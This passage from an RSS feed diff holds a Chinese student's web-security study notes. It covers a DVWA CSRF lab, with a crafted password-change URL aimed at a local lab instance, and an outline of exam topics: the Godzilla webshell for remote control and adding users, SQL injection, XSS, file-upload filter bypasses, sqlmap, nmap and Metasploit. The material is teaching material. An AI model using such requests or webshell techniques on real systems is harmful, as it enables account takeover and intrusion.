+&lt;p&gt;虚拟机下CSRF攻击&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;简单的话
+构建响应的url，
+http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=45&amp;amp;password_conf=45&amp;amp;Change=Change#
+在本浏览器新建页面后进去构建好的url，页面显示密码修改成功。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;中等的话
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-5176172a38b24276947c3a14945a2a64.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-0deae3d355b0474c809a8a2e5e3dc52c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;杂项&#34;&gt;杂项&lt;/h2&gt;
+&lt;p&gt;哥斯拉木马的使用，远程控制，远程控制机上上传文件生成一个用户&lt;/p&gt;
+&lt;p&gt;Php代码理解，分析漏洞&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;网络安全形式
+（通过什么方法防范什么问题达到什么效果）通过采取必要措施，防范对网络的攻击、入侵、干扰、破坏和非法使用以及意外事故，使网络处于可靠运行的状态，以及保障网络的存储，传输，处理信息的完整性，保密性，可用性的能力。
+网络安全：网络运行（服务器崩溃）+网络信息安全&lt;/li&gt;
+&lt;li&gt;网络安全渗透  攻击  网页篡改  远程攻击
+渗透过程（流程图会画）
+踩点  提权
+检索方式:site inurl&lt;/li&gt;
+&lt;li&gt;网络安全  渗透工程师  职业&lt;/li&gt;
+&lt;li&gt;开发  大数据&lt;/li&gt;
+&lt;li&gt;SQL注入  Union boolean  报错信息
+Union  函数  -版本号（目的：漏洞  利用）
+Boolean  &amp;ndash;(yes/no) 枚举  报错信息&lt;/li&gt;
+&lt;li&gt;登录  查询&lt;/li&gt;
+&lt;li&gt;SQL语句  标准  常规  异类&lt;/li&gt;
+&lt;li&gt;库、表、字段&amp;mdash;&amp;gt; 管理  系统表 &amp;ndash;&amp;gt; 加密存储&lt;/li&gt;
+&lt;li&gt;工具
+bs&lt;br&gt;
+sqlmap
+nmap&lt;/li&gt;
+&lt;li&gt;bs&amp;mdash;proxy代理（浏览器）  发出请求  响应response  扫描scanner&lt;br&gt;
+拦截  篡改  钓鱼  代理
+暴力破解（密码字典  原理   工具）&lt;/li&gt;
+&lt;li&gt;html静态 交互
+部署   php使用&amp;mdash;数据库增删改查IDUS   服务(sqldemo） index.php&lt;/li&gt;
+&lt;li&gt;xss
+js  php
+交互   对话框
+反射型  存储型  脚本  执行
+dom型&lt;/li&gt;
+&lt;li&gt;文件上传&lt;/li&gt;
+&lt;li&gt;哥斯拉&amp;mdash;做木马  php
+绕过 Js
+文件类型  绕过
+文件后缀  绕过
+远程控制&lt;/li&gt;
+&lt;li&gt;IP端口  URL   &amp;mdash;&amp;gt;网络&lt;/li&gt;
+&lt;li&gt;靶机  物理机  （必考）&lt;/li&gt;
+&lt;li&gt;test.sql上传数据库  导入数据&lt;/li&gt;
+&lt;li&gt;CSRF&lt;/li&gt;
+&lt;li&gt;KALI   msf   ms&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
